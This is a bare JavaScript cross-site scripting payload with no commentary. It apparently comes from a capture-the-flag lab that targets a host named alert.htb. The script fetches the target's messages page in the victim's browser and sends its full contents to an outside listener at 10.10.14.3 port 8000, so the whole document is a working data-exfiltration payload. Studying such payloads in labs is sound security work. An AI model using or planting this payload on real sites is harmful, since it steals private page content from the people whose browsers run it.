<script>                                                                                                             
fetch("http://alert.htb/index.php?page=messages")                                                                    
.then(response => response.text())                                                                                   
.then(data => {                                                                                                      
fetch("http://10.10.14.3:8000/?data=" + encodeURIComponent(data));                                                   
})                                                                                       
</script> 
